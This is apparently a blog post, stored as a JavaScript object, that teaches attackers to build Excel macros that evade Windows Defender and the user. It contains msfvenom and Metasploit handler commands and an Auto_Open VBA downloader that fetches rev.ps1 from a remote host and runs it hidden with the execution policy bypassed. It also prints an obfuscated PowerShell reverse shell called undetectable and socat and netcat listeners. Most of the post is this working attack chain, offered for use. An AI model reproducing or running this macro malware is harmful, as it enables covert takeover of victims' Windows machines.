const newPost = {
    title: 'Macros With N1NJ10 [ Undetectable Windows 11&10]',
    body: `

    <h1><strong>Frist we need to understand what is Macros ? </strong></h1>
    <p>Macros are used to automate frequently used tasks. Hackers have been using Macros for a long time as a means to gain initial access to target networks by injecting malicious code into macros. These macros are all called malicious macros or macro malware or macro virus. Let’s see how to create a malicious macro to exploit Windows devices, For more info you can click <a href="https://en.wikipedia.org/wiki/Macro\_and\_security">here</a></p>
    <ul>
    <li><h3 id="create-vba-payload-x20-">Create VBA Payload&#x20;</h3>
    </li>
    </ul>
    <p>First, we need to generate our malicious with Metasploit</p>
    <div class="script-container"><h4>Attacker</h4>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~]
    └─<span class="hljs-meta"># msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<span class="hljs-meta-string">&lt;ATTACKER_IP&gt;</span> LPORT=<span class="hljs-meta-string">&lt;ATTACKER_PORT&gt;</span> -e x86/shikata_ga_nai -i 2 -f vba</span>
    </code></pre></div>
    
    <p><br>It will generate something like this, Save it we will use it later</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/1.png" alt=""><figcaption><p><strong><li>How to Excel</strong></p></figcaption></figure>
    
    <p>Then go to the Windows machine, I prefer to use Windows 10 for this task,</p>
    <ul>
    <li>Then open the Excel Program</li>
    <li>Write blabla in empty columns</li>
    <li>Go to the “view” tab</li>
    <li>Click on macros and select its sub-menu option “view macros“.</li>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/2.png" alt=""><figcaption><p><strong><li>Create_Bad_Macro</strong></p></figcaption></figure>
    
    <ul>
    <li>Then type your macro file name and click create</li>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/3.png" alt=""><figcaption><p><strong><li>Paste_Me</strong></p></figcaption></figure>

    </ul>
    
    <ul>
    <li>Remember the payload from the first, Go and copy it and paste it into the code Block</li>
    </ul>
    <figure>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/4.png" alt=""><figcaption><p><strong><li>Save_Me</strong></p></figcaption></figure>
    <ul>

    <p><li>Save the file as &quot; </strong><mark style="color:yellow;">Excel Macro-Enabled Workbook</mark>&quot;  type</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/5.png" alt=""><figcaption></figcaption></figure>
    </ul>

    <p><li>Last but not least we need to set our handler to establish the connection, From your Attacker machine</p>
    <div class="script-container"><h4>Attacker</h4>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~]
    └─# msfconsole -q -x " use exploit/multi/handler; <span class="hljs-built_in">set</span> -g PAYLOAD windows/x64/meterpreter/reverse_https;<span class="hljs-built_in">set</span> -g LHOST &lt;ATTACKER_IP&gt; ;<span class="hljs-built_in">set</span> -g LPORT &lt;ATTACKER_PORT&gt; ; run"
    </code></pre></div>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/6.png" alt=""><figcaption><p><strong><li>Enable_Macro</strong></p></figcaption></figure>
    <ul>
    <li>Now, we are good to start our POC, Go to your Windows machine and open our file Then click on the “<mark style="color:yellow;">Enable Content</mark>” button</li>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/7.png" alt=""><figcaption><p><strong><li>Fail</strong></p></figcaption></figure>
    
    <p>Then go to your Meterpreter, Pingo The Windows Defender blocks the script and block the file also&#x20;</p>
    <p>&#x20;</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/8.png" alt=""><figcaption><p><strong>Peter Kim</strong></p></figcaption></figure>
    
    <p><strong>Despite of we encoded our payload with the shikata_ga_nai encoder the Defender detected us, So we aren&#39;t script kiddies As Peter Kim said in Playbook2 &quot;</strong><mark style="color:yellow;"><strong>My feelings on Anti-Virus (AV) scanners are that they are there to stop the script kiddies or old malware</strong></mark><strong>&quot;</strong></p>
    <p>So I tried many ways to achieve this, and here are some ways that I can bypass the Defender and the Firewall</strong>&#x20;</p>
    
    <ul>
    <li><h1>Unicorn</h1>
    </li>
    </ul>
    <p>Magic Unicorn is a simple tool for using a PowerShell downgrade attack and injecting shellcode straight into memory. Based on Matthew Graeber&#39;s PowerShell attacks and the PowerShell bypass technique</p>
    <p><strong>First, You need to download the repo from</strong> <a href="https://github.com/trustedsec/unicorn"><strong>github</strong> </a></p>
    <div class="script-container"><h4>Attacker</h4></div>

    <pre><code>git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/trustedsec/unicorn.git
    </code></pre><p>Then you are ready to generate your payload&#x20;</p>
    <div class="script-container"><h4>Attacker</h4>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/Downloads/tools/unicorn]
    └─# <span class="hljs-keyword">python3</span> unicorn.<span class="hljs-keyword">py</span> windows/meterpreter/reverse_https <span class="hljs-symbol">&lt;ATTACKER_IP&gt;</span> <span class="hljs-symbol">&lt;ATTACKER_PORT&gt;</span>  macro
    
    </pre><p> <p style="color:Yellow;"><strong>Note:</p>x64 meterpreter payload selected which is not compatible. Unicorn handles shellcode creation on both 32 and 64 by using an x86 downgrade attack regardless of 32 and 64 bit platforms. No interaction needed, downgrading to 32-bit payload</strong>.</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/9.png" alt=""><figcaption><p><strong>Then</strong></p></figcaption></figure>
    
    <p><li>Go to your Windows machine and repeat the steps we did before opening Excel ..... , execpt copy our payload from the Powershell_attack.txt file that unicorn generate</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/10.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
    
    <p><li>Then save the file</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/11.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
    
    <p>We need to set our listener now , from the attacker machine&#x20;</p>
    <div class="script-container"><h4>Attacker</h4>

    <pre><code>
    ┌──(root㉿N1NJ10)-[~/Downloads/tools/unicorn]
    └─# msfconsole -q -x " <span class="hljs-keyword">use</span> exploit/multi/<span class="hljs-keyword">handler</span>; <span class="hljs-keyword">set</span> -g PAYLOAD windows/meterpreter/reverse_https;<span class="hljs-keyword">set</span> -g LHOST &lt;ATTACKER_IP&gt; ;<span class="hljs-keyword">set</span> -g LPORT &lt;ATTACKER_PORT&gt; ;<span class="hljs-keyword">set</span> AutoRunScript <span class="hljs-string">'migrate -n explorer.exe'</span>;<span class="hljs-keyword">set</span> EXITONSESSION <span class="hljs-literal">false</span>; <span class="hljs-keyword">set</span> EXITFUNC <span class="hljs-keyword">thread</span>; run"
    </code></pre>
    <ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/12.png" alt=""><figcaption></figcaption></figure>
    </ul>

    <p>Now we are good to establish the attack, Go to your windows and launch the Excel file&#x20;</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/13.png" alt=""><figcaption><p></p></figcaption></figure>
    
    <p>Click on &quot; Enable Content &quot;, and you should see this error message</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/14.png" alt=""><figcaption><p></p></figcaption></figure>
    
    <p>Then go to your Attacker machine, you should see that</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/15.png" alt=""><figcaption><p><strong>Pingo 🥳</strong></p></figcaption></figure>
    
    <p>But this method may the user to call his supervisor and tell him about this problem or he may guess this is a suspicious file so <mark style="color:yellow;">we fail again.</mark></p>
    <ul>
    <li><h1>CVE-2017-8759</h3>
    </li>
    </ul>
    <p>A remote code execution vulnerability exists when Microsoft .NET Framework processes untrusted input. An attacker who successfully exploited this vulnerability in software using the .NET framework could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights. To exploit the vulnerability, an attacker would first need to convince the user to open a malicious document or application. The security update addresses the vulnerability by correcting how .NET validates untrusted input.</p>
    <a href="https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-8759/" data-rnwi-u529wo-aq1qub-c1zw6o-1k4bu33-1cut0bx-na6qhi--hover="true" data-rnwi--1tgwseu--focus="true" data-rnwi-5xr8s6-dse9kg-1rbj2e8-2fw26j-focus-visible="true" data-rnwi-handle="BaseCard" class="base-card" r-lrvibr r-1loqt21 r-1otgn73 r-m2nopt r-z2wwpe r-rs99b7 r-1udh08x r-1clhhh9 r-18u37iz r-1awozwy r-nsbfu8" ><div class="image-icon"><img alt="" src="https://www.rapid7.com/includes/img/favicon.ico" width="100%" height="auto" decoding="async" data-rnwibasecard--6b6lzv-hover="true" data-rnwi-handle="nearest" class="r-hd655f" style="width: 32px; height: 32px; border-radius: 4px;"></div><div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2"><div class="css-175oi2r r-18u37iz r-1awozwy"><div dir="auto" data-rnwibasecard--6b6lzv-hover-focus="true" data-rnwi-handle="nearest" class="css-1rynq56 r-dnmrzs r-1udh08x r-1udbk01 r-3s2u2q r-1iln25a r-gg6oyi r-ubezar r-135wba7 r-majxgm r-z9jf92" title="Penetration Testing with Shellcode: Detect, exploit, and secure network-level and operating system vulnerabilities">Microsoft CVE-2017-8759: .NET Framework Remote Code Execution Vulnerability</div></div><div class="css-175oi2r"><div dir="auto" class="css-1rynq56 r-gg6oyi r-1b43r93 r-16dba41 r-hbpseb r-1f2v84d">rapid7.com</div></div></div></a>
    <ul>
    <p>So we can upload a file with a script without being detected this is suspicious keep it or not  so now we need 3 main things to make this happen :</p>
    
    <li><mark style="color:yellow;">VBA script</mark>  to download our file in a stealthy way</li>
    <li><mark style="color:yellow;">Undetectable reverse shell</mark></li>
    <li><mark style="color:yellow;">Listener</strong></mark> to establish the connection</strong>&#x20;</li>
    </ul>

    <h1><li>Let's start with the VBA script</strong>&#x20;</h3>
    <ul>
    
    <div class="script-container"><h4>VBA Script</h4>

    <pre><code><span class="hljs-keyword">Sub</span> Auto_Open()             
    
    <span class="hljs-keyword">If</span> <span class="hljs-built_in">Len</span>(Dir(<span class="hljs-string">"c:\temp"</span>, vbDirectory)) = <span class="hljs-number">0</span> <span class="hljs-keyword">Then</span>
    MkDir <span class="hljs-string">"c:\temp"</span>
    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span>
    
    <span class="hljs-keyword">Dim</span> xHttp: <span class="hljs-keyword">Set</span> xHttp = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">"Microsoft.XMLHTTP"</span>)
    <span class="hljs-keyword">Dim</span> bStrm: <span class="hljs-keyword">Set</span> bStrm = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">"Adodb.Stream"</span>)
    xHttp.Open <span class="hljs-string">"GET"</span>, <span class="hljs-string">"http://10.0.2.8:800/rev.ps1"</span>, <span class="hljs-literal">False</span>
    xHttp.Send
    
    <span class="hljs-keyword">With</span> bStrm
    .Open
    .Type = <span class="hljs-number">1</span> <span class="hljs-comment">'//binary</span>
    .write xHttp.responseBody
    .savetofile <span class="hljs-string">"c:\temp\rev.ps1"</span>, <span class="hljs-number">2</span> <span class="hljs-comment">'//overwrite</span>
    <span class="hljs-keyword">End</span> <span class="hljs-keyword">With</span>
    Shell (<span class="hljs-string">"powershell -ep bypass -WindowStyle Hidden c:\temp\rev.ps1"</span>)
    <span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span>
    </code></pre>
    </pre><p> <p style="color:Yellow;"><strong>Note</strong>:</p>This script <a href="https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/main/src/Download\_Autostart.vba">here</a> helped me build mine</p>

    <p><strong><li>what does this script really do :</strong></p>
    <ul>
    <li>It first checks whether the c:\\temp exists or not if yes it keeps it if not it will creates one</li>
    
    <p><li>You can delete this line if you don&#39;t want to make a dir in the destination</li></p>
    

    <p><li>Then we establish a connection to make the victim download our malicious payload, The ADO technology is used for saving the contents of the file to disk. Both technologies are launched by the <a href="https://www.promotic.eu/en/pmdoc/ScriptLangs/VBScript/PropMeth/CreateObject.htm"> CreateObject</a> method</li></p>
   
    <p><li>
    This script <a href="https://gist.github.com/caglarorhan/44f7ebcc857f0c1be1aff2cc13349c23">here</a> helped me with this step, for more info click <a href="https://www.promotic.eu/en/pmdoc/Directions/HowSaveBinFileInWeb.htm">here</a>
    </li></p>

    <li><p>Then save our file in the temp directory, and execute it with -ep bypass to Bypassing the PowerShell Execution Policy and the -WindowStyle Hidden to hide the window from the user</p>
    </li>
    </ul>
    <p><strong>That&#39;s it for the VBA script it now good to download our malicious payload</strong>&#x20;</p>
    <p>Next, we need to get Undetectable Reverse PowerShell in this step you can use tools or Frameworks to generate your payload such as <a href="https://github.com/EmpireProject/Empire">Empire</a>,<a href="https://github.com/Veil-Framework/Veil">Veil</a>, <a href="https://www.metasploit.com/download">Metasploit</a>, ....</p>
    <p>But fortunately, I found a good Undetectable Reverse PowerShell from</strong> <a href="https://gist.github.com/guglia001/1de961b6b7fef4ef4f383015bb0f7c1e">here </a></p>
    
    
    <div class="script-container"><h4>Undetectable Reverse PowerShell</h4>

    <pre><code>$KLK = <span class="hljs-keyword">New</span>-Object System.Net.Sockets.TCPClient(<span class="hljs-string">'&lt;ATTACKER_IP&gt;'</span>,<span class="hljs-string">'&lt;ATTKER_PORT&gt;'</span>);
    $PLP = $KLK.GetStream();
    [byte[]]$VVCCA = <span class="hljs-number">0.</span>.((<span class="hljs-number">2</span>-shl(<span class="hljs-number">3</span>*<span class="hljs-number">5</span>))<span class="hljs-number">-1</span>)|%{<span class="hljs-number">0</span>};
    $VVCCA = ([text.encoding]::UTF8).GetBytes(<span class="hljs-string">"Succesfuly connected .\`n\`n"</span>)
    $PLP.Write($VVCCA,<span class="hljs-number">0</span>,$VVCCA.Length)
    $VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + <span class="hljs-string">' &gt; '</span>)
    $PLP.Write($VVCCA,<span class="hljs-number">0</span>,$VVCCA.Length)
    [byte[]]$VVCCA = <span class="hljs-number">0.</span>.((<span class="hljs-number">2</span>-shl(<span class="hljs-number">3</span>*<span class="hljs-number">5</span>))<span class="hljs-number">-1</span>)|%{<span class="hljs-number">0</span>};
    <span class="hljs-keyword">while</span>(($A = $PLP.Read($VVCCA, <span class="hljs-number">0</span>, $VVCCA.Length)) -ne <span class="hljs-number">0</span>){;$DD = (<span class="hljs-keyword">New</span>-Object System.Text.UTF8Encoding).GetString($VVCCA,<span class="hljs-number">0</span>, $A);
    $VZZS = (i\`eX $DD <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-String );
    $HHHHHH  = $VZZS + (pwd).Path + <span class="hljs-string">'! '</span>;
    $L = ([text.encoding]::UTF8).GetBytes($HHHHHH);
    $PLP.Write($L,<span class="hljs-number">0</span>,$L.Length);
    $PLP.Flush()};
    $KLK.Close()
    </code></pre>
    
    <p>@This a good one and Undetectable at the time of this Writeup</strong>&#x20;</p>
    <p>   <li>For the listener you can use <a href="https://www.varonis.com/blog/netcat-commands">Netcat</a> but I prefer using <a href="https://www.redhat.com/sysadmin/getting-started-socat">Socat</a> cuz it is more stealthy</p>
    <p><strong>Now Let the Game start</strong>&#x20;</p>
    <ul>
    <p><strong><li>First go to your windows machine :<li></strong></p>

    <p>Write blabla in empty columns</strong>&#x20;</p>
    <li>Go to the “view” tab</p>
    <li>Click on macros and select its sub-menu option “view macros“.</strong></li>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/16.png" alt=""><figcaption><p></p></figcaption></figure>
    
    <ul>
    <li>Then type your macro file name and click create</li>
    <li>Copy our VBA script after add your IP and port  Then paste it into the code Block</li>
    </ul>

    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/17.png" alt=""><figcaption><p></p></figcaption></figure>
    
    <ul>
    <li>Save the file as &quot; <mark style="color:yellow;">Excel Macro-Enabled Workbook</strong></mark> &quot; type</li>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/18.png" alt=""><figcaption><p></p></figcaption></figure>
    
    <ul>
    <li>Now go to the Attacker machine and save our payload file in a file called &quot;rev.ps1&quot;</li>
    </ul>
    <p>
    If you wanna to edit the file name you should edit it in the VBAS script aslo
    </p>
    <ul>
    <li>Then make a python http server with the port you choose and write in the VBA script</li>
    </ul>

    <div class="script-container"><h4>Undetectable Reverse PowerShell</h4>

    <pre><code>
    ┌──(root㉿N1NJ10)-[~/Downloads/tools/unicorn]
    └─# msfconsole -q -x " <span class="hljs-keyword">use</span> exploit/multi/<span class="hljs-keyword">handler</span>; <span class="hljs-keyword">set</span> -g PAYLOAD windows/meterpreter/reverse_https;<span class="hljs-keyword">set</span> -g LHOST &lt;ATTACKER_IP&gt; ;<span class="hljs-keyword">set</span> -g LPORT &lt;ATTACKER_PORT&gt; ;<span class="hljs-keyword">set</span> AutoRunScript <span class="hljs-string">'migrate -n explorer.exe'</span>;<span class="hljs-keyword">set</span> EXITONSESSION <span class="hljs-literal">false</span>; <span class="hljs-keyword">set</span> EXITFUNC <span class="hljs-keyword">thread</span>; run"
    </code></pre>
    <ul>
    
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/19.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
    </ul>

    <ul>
    <li>Then we need to start our Socat</li>
    <div class="script-container"><h4>Socat</h4>
    <pre><code>
    ┌──(<span class="hljs-selector-tag">root</span>㉿<span class="hljs-selector-tag">N1NJ10</span>)<span class="hljs-selector-tag">-</span><span class="hljs-selector-attr">[~/Downloads/tools/random_scripts]</span>
    └─# <span class="hljs-selector-tag">socat</span> <span class="hljs-selector-tag">TCP4-LISTEN</span><span class="hljs-selector-pseudo">:1234</span>,<span class="hljs-selector-tag">fork</span> <span class="hljs-selector-tag">STDOUT</span>
    </code></pre>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/20.png" alt=""><figcaption><p></p></figcaption></figure>
    
    <p>You can use &quot; rlwrap nc -nlvp 1234 &quot; for netcat&#x20;</p>

    <p>Before we start, look at my C: dir</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/21.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
    
    <p>There is no dir called Temp here, It is just for POC</p>
    <ul>
    <li><h3> Here We goo 🥷</h3></li>
    </ul>
    <p>Go to your Windows machine and open our file Then click on the “<mark style="color:yellow;">Enable Content</mark>” button</p>
    
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/22.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
    
    <p>once you click you will notice no nothing malicious happened, but that&#39;s the point of being stealthy cuz we are the guys who know what should happen We will see in particular places<</p>
    <ul>

    <li>First, you will notice that there is a temp dir just created and it contains a file called rev.ps1 that&#39;s our reverse shell, the user will notice nothing the Excel will not exit or something not normal will happen like before</li>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/23.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
    
    <ul>
    <li>Now go to your Attacker machine you will notice that the Python HTTP server send a file called rev.ps1 which is our payload</li>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/24.png" alt=""><figcaption><p><strong></strong></p></figcaption></figure>
    
    <ul>
    <li>Go to the tab you open the Socat listener to check</li>
    </ul>

    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/25.png" alt=""><figcaption><p><strong>N1NJ10</strong></p></figcaption></figure>
    
    <ul>
    <li>Pingo, We got the shell with no warnings&#x20;</li>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/26.jpg" alt=""><figcaption><p><strong>N1NJ10</strong></p></figcaption></figure>
    
    <p>That&#39;s it, my friend, I&#39;m happy to share with you more of my articles and tips\&amp;tricks If you want just Subscribe to our Telegram channel :</strong>&#x20;</p>
    <a href="https://t.me/N1NJ10" data-rnwi-u529wo-aq1qub-c1zw6o-1k4bu33-1cut0bx-na6qhi--hover="true" data-rnwi--1tgwseu--focus="true" data-rnwi-5xr8s6-dse9kg-1rbj2e8-2fw26j-focus-visible="true" data-rnwi-handle="BaseCard" class="base-card" r-lrvibr r-1loqt21 r-1otgn73 r-m2nopt r-z2wwpe r-rs99b7 r-1udh08x r-1clhhh9 r-18u37iz r-1awozwy r-nsbfu8" ><div class="image-icon"><img alt="" src="https://cdn4.telegram-cdn.org/file/MlS1IzvCXydqvFSIu6454raNgj2Fmi1dicjQHNsOy8c4DvkqGPwSxU92hIku3jl9nJgG3NXlzzHM-umAGKaNWj37PSXnQzYm43C7HQfbzhb2x_qd8Mh2R6itnT99dR75W7er_lan6AZsZOIrfG7UqK3n5G_L3XRBBo6BPy60v7z5zLi_OLgk4_k9K5xsSekxVMuP2u98c6WE5yQdNqZ06M7DF2oxcTNuJ5QqbLgAETPzJLl1LTm6VsiMZKqTRW0HcIbeAvgDaDh-uemooB4HA-PpduSAM0Rxz-y83VBlELmlCbuM2FOh1KpIvvJFUCrGsxLhVOYvlUXyUdeVd2Fckw.jpg" width="100%" height="auto" decoding="async" data-rnwibasecard--6b6lzv-hover="true" data-rnwi-handle="nearest" class="r-hd655f" style="width: 32px; height: 32px; border-radius: 4px;"></div><div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2"><div class="css-175oi2r r-18u37iz r-1awozwy"><div dir="auto" data-rnwibasecard--6b6lzv-hover-focus="true" data-rnwi-handle="nearest" class="css-1rynq56 r-dnmrzs r-1udh08x r-1udbk01 r-3s2u2q r-1iln25a r-gg6oyi r-ubezar r-135wba7 r-majxgm r-z9jf92" title="Penetration Testing with Shellcode: Detect, exploit, and secure network-level and operating system vulnerabilities">N1NJ10 Channel</div></div><div class="css-175oi2r"><div dir="auto" class="css-1rynq56 r-gg6oyi r-1b43r93 r-16dba41 r-hbpseb r-1f2v84d">https://t.me/</div></div></div></a>

    
    <p><strong>LinkedIn:-</strong> <a href="https://www.linkedin.com/in/fadymoheb"><strong>https://www.linkedin.com/in/fadymoheb</strong></a></p>
    <p><strong>Facebook:-</strong> <a href="https://www.facebook.com/FADYMo7eB"><strong>https://www.facebook.com/FADYMo7eB</strong></a></p>
    <p><strong>Twitter:-</strong> <a href="https://twitter.com/FadyMo7eb?s=09"><strong>https://twitter.com/FadyMo7eb?s=09</strong></a></p>
    <p><strong>Tryhackme:-</strong> <a href="https://tryhackme.com/p/FadyMoheb"><strong>https://tryhackme.com/p/FadyMoheb</strong></a></p>
    <p><strong>See you in another great writeup 😉</strong><a href="https://medium.com/tag/reverse-engineering?source=post\_page-----59e1120bde30---------------reverse\_engineering-----------------">\
    </a>\
    \</p>
    `,
    description: 'Hey there in this article I will show you  some ways that you can exploit Windows devices using Macros in a stealthy way that undetectable on windowsdefender , Firewall,l and the user',
    date: new Date(2023,9,7),
    previewPicture: '/pages/Photos/Macro.jpg',
    tags: ['ECPTX','Macros','socat','Unicorn'],
    author: 'N1NJ10',
    category: 'Windows'
};

export default newPost;
